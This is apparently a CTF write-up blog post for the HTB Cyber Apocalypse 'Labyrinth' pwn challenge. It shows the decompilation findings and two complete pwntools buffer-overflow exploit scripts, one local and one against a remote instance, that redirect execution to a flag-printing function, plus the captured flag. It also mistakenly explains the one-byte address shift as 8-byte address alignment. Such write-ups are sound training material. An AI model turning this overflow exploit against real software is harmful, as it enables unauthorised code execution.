---
external: false
draft: false
title: PWN - Labyrinth
snippet: ""
image:
  {
    src: "/images/htb/htb_ca_ctf.png",
    alt: "full stack web development",
  }
publishDate: 2023-03-21
category: "HTB Cyber Apocalypse"
author: "Ugur Ilter"
tags: [ctf, hacking, security]
---

```
Labyrinth
You find yourself trapped in a mysterious labyrinth, with only one chance to escape.
Choose the correct door wisely, for the wrong choice could have deadly consequences.

Points: 300
Difficulty: Easy
```

In this challenge you are given a docker instance and also some files that you can download.
The archive consisted of 2 files (flag.txt, labyrinth) and a folder which had some linux shared objects for the binary to run.

Once you run the binary you are welcomed by an ascii art and a prompt asking you for a door number.

```
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒-▸        ▒           ▒          ▒
▒-▸        ▒     O     ▒          ▒
▒-▸        ▒    '|'    ▒          ▒
▒-▸        ▒    / \    ▒          ▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒

Select door:

Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010
Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020
Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030
Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040
Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050
Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060
Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070
Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080
Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090
Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100

>>
```

So i throw the binary to my decompiler and found out that the correct door number is '69' or '069'.

![HTB](/images/htb/pwn/labyrinth/correct_door.png)

After entering the correct door number we are again left with a new prompt.

```
You are heading to open the door but you suddenly see something on the wall:

"Fly like a bird and be free!"

Would you like to change the door you chose?

>>
```

No matter what input you enter it does not work. Also looking at the decompiled source code there was no way to get the flag by entering 'some correct answer'.
This challenge requires a buffer overflow attack, so i created a new python script using pwntools. During my codewalk in the decompiled source i saw the function called 'escape_plan' which actually does open 'flag.txt' file and print out the flag. So i first needed the address of 'escape_plan' function, which i got via objdump.

![HTB](/images/htb/pwn/labyrinth/func_address.png)

With the address (0x401255) in hand i tried sending different sizes of payloads to detect the offset required for rip register so i could inject the address of 'escape_plan' there to execute and get the flag. So the offset was 56. Afte that, i tried with the script and i was able to get the ascii art showing me that i was able to escape the labyrinth but there was no flag ! After a while (couple of hrs) i realized my mistake here and changed the address with 0x401256 since 0x401255 was not multiple of 8-bytes (64 bit addresses !).
With the new fix in hand i was able to get the local flag.

```python
#!/usr/bin/python3.8
from pwn import *

def print_lines(io):
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

binary_path = "labyrinth"
elf         = ELF(binary_path)
offset = 56
# new_rip = p64(elf.symbols["escape_plan"])     # 0x401255 was not multiple of 8 !!!
return_address = p64(elf.symbols["main"])

payload = b"".join(
    [
        b"A"  * offset,
        # new_rip,                              # get rid of this and use 0x401256
        b'\x56\x12\x40\x00\x00\x00\x00\x00',
        return_address
    ]
)

with open("payload", "wb") as filp:
    filp.write(payload)

io = process(elf.path)
io.recvregex(b'>>')
io.sendline(b'069')
io.recvregex(b'>>')
io.sendline(payload)
print_lines(io)
```

Now it was time to create a new script with pwntools to run the bof attack on remote docker instance.

```python
#!/usr/bin/python3.8
from pwn import *

def print_lines(io):
    info("printing io received lines")
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

# Setup and open connection
IP   = '165.227.224.40' # Change this
PORT = 30575            # Change this
r    = remote(IP, PORT)

# Craft payload
offset = 56
padding = b"A" * offset
retaddr = p64(0x401256)
payload = b"".join([padding, retaddr])

# Wait for prompt
print(r.recvregex(b'>>').decode())

# Send first input
r.sendline(b'069')

# Wait for new prompt
print(r.recvregex(b'>>').decode())

# Send payload
r.sendline(payload)

# Get the flag !
print_lines(r)
```

![HTB](/images/htb/pwn/labyrinth/flag.png)

```
Flag: HTB{3sc4p3_fr0m_4b0v3}
```